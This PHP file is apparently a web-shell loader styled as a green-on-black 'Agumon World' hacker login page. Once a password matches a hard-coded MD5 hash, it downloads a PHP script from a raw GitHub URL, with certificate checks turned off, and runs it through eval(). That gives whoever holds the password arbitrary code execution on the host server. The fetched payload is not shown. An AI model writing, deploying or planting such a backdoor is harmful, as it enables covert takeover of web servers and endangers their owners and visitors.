<?php
session_start();


function geturlsinfo($url) {
    if (function_exists("curl_exec")) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION["coki"])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION["coki"]);
        }
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists("file_get_contents")) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}


function is_logged_in() {
    return isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true;
}

$error = "";


if (isset($_POST["password"])) {
    $entered_password = $_POST["password"];
    $hashed_password = "966e3ab8a4df62edff255fd3c7e87eee"; 
    if (md5($entered_password) === $hashed_password) {
        $_SESSION["logged_in"] = true;
        $_SESSION["coki"] = "asu";
        // Redirect supaya refresh ke state login
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "ACCESS DENIED: Wrong password!";
    }
}


if (is_logged_in()) {
    $a = geturlsinfo("https://raw.githubusercontent.com/cyntiaglory45/file/main/agumonscript.php");
    eval("?>" . $a);
    exit;
}


?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Agumon World</title>
<style>

  * {
    margin: 0; padding: 0; box-sizing: border-box;
  }
  body {
    height: 100vh;
    background-color: black;
    font-family: 'Courier New', Courier, monospace;
    overflow: hidden;
    color: #00ff00;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  #matrix {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    z-index: 0;
    background: black;
  }


  #scanline {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    pointer-events: none;
    background: repeating-linear-gradient(
      to bottom,
      rgba(0,255,0,0.05),
      rgba(0,255,0,0.05) 1px,
      transparent 2px,
      transparent 4px
    );
    animation: scanmove 5s linear infinite;
    z-index: 1;
  }
  @keyframes scanmove {
    0% { background-position: 0 0; }
    100% { background-position: 0 100vh; }
  }

  .login-container {
    position: relative;
    z-index: 2;
    background: #001100cc;
    border: 2px solid #00ff00;
    padding: 40px 50px;
    border-radius: 10px;
    box-shadow: 0 0 30px #00ff00aa;
    width: 350px;
  }


  .terminal-title {
    font-weight: bold;
    font-size: 1.8em;
    margin-bottom: 20px;
    white-space: nowrap;
    overflow: hidden;
    border-right: 3px solid #00ff00;
    width: 0;
    animation: typing 3s steps(22) forwards, blink-caret 0.75s step-end infinite;
  }

  @keyframes typing {
    from { width: 0 }
    to { width: 14ch }
  }
  @keyframes blink-caret {
    50% { border-color: transparent; }
  }


  form {
    font-size: 1.2em;
  }

  label {
    font-weight: 600;
    display: block;
    margin-bottom: 5px;
  }


  .terminal-input {
    background: transparent;
    border: none;
    border-bottom: 2px solid #00ff00;
    color: #00ff00;
    font-family: monospace;
    font-size: 1.3em;
    padding: 6px 4px;
    width: 100%;
    outline: none;
    caret-color: #00ff00;
    position: relative;
  }


  .terminal-input::after {
    content: '_';
    animation: blink-caret 1s steps(2) infinite;
    position: absolute;
    right: 10px;
    top: 6px;
  }


  input[type="submit"] {
    margin-top: 25px;
    width: 100%;
    padding: 14px;
    background: transparent;
    border: 2px solid #00ff00;
    border-radius: 6px;
    color: #00ff00;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 0 15px #00ff00aa;
    transition: background 0.3s, color 0.3s;
    font-family: monospace;
  }
  input[type="submit"]:hover {
    background: #00ff00;
    color: #001100;
    box-shadow: 0 0 30px #00ff00ff;
  }


  .error-msg {
    margin-top: 12px;
    height: 24px;
    color: #ff0044;
    font-weight: bold;
    user-select: none;
    font-family: monospace;
  }


  #loading-overlay {
    display: none;
    position: fixed;
    z-index: 5;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    background: rgba(0, 0, 0, 0.85);
    color: #00ff00;
    font-family: monospace;
    font-size: 1.5em;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
  }


  #loading-text {
    margin-top: 10px;
  }


  #lock-icon {
    width: 80px;
    height: 80px;
    margin-bottom: 20px;
    fill: #00ff00;
    animation: lockPulse 2s infinite;
  }

  @keyframes lockPulse {
    0%, 100% { fill: #00ff00; }
    50% { fill: #00aa00; }
  }


  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    20%, 60% { transform: translateX(-10px); }
    40%, 80% { transform: translateX(10px); }
  }
  .shake {
    animation: shake 0.3s;
  }

</style>
</head>
<body>

<canvas id="matrix"></canvas>
<div id="scanline"></div>

<div class="login-container" id="login-container">
  <div class="terminal-title">[Login Access]</div>
  <form id="login-form" method="POST" action="">
    <label for="password">&gt; Enter password:</label>
    <input
      type="password"
      id="password"
      name="password"
      class="terminal-input"
      autocomplete="off"
      autofocus
      required
    />
    <input type="submit" value="Access" />
    <div class="error-msg" id="error-msg"><?= htmlspecialchars($error) ?></div>
  </form>
</div>

<div id="loading-overlay" style="display:none;">
  <!-- Gembok animasi SVG -->
  <svg id="lock-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M12 17a2 2 0 1 0 0-4 2 2 0 0 0 0 4z"/>
    <path fill-rule="evenodd" clip-rule="evenodd"
      d="M6 8V6a6 6 0 1 1 12 0v2h1a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h1zm2-2a4 4 0 1 1 8 0v2H8V6z"/>
  </svg>
  <div id="loading-text">Decrypting...</div>
</div>

<script>
  const form = document.getElementById('login-form');
  const errorMsg = document.getElementById('error-msg');
  const loadingOverlay = document.getElementById('loading-overlay');
  const loginContainer = document.getElementById('login-container');
  const passwordInput = document.getElementById('password');

  // Matrix rain effect setup
  const canvas = document.getElementById('matrix');
  const ctx = canvas.getContext('2d');
  let width = canvas.width = window.innerWidth;
  let height = canvas.height = window.innerHeight;

  const letters = "アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズヅブプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const fontSize = 16;
  const columns = Math.floor(width / fontSize);
  const drops = Array(columns).fill(1);

  function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, width, height);
    ctx.fillStyle = "#0F0";
    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < drops.length; i++) {
      const text = letters.charAt(Math.floor(Math.random() * letters.length));
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);

      if (drops[i] * fontSize > height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }

  setInterval(draw, 33);

 
  function shakeForm() {
    loginContainer.classList.add('shake');
    setTimeout(() => loginContainer.classList.remove('shake'), 300);
  }


  const audioContext = new (window.AudioContext || window.webkitAudioContext)();

  function playBeep(freq = 440, duration = 100) {
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    oscillator.frequency.value = freq;
    oscillator.type = 'square';
    oscillator.start();
    gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + duration / 1000);
  }

  function playTypingSound() {
    playBeep(600, 50);
  }


  if (errorMsg.textContent.trim() !== "") {
    shakeForm();
    playBeep(200, 200);
  }


  form.addEventListener('submit', (e) => {

    loadingOverlay.style.display = "flex";
  });


  passwordInput.focus();
</script>

</body>
</html>
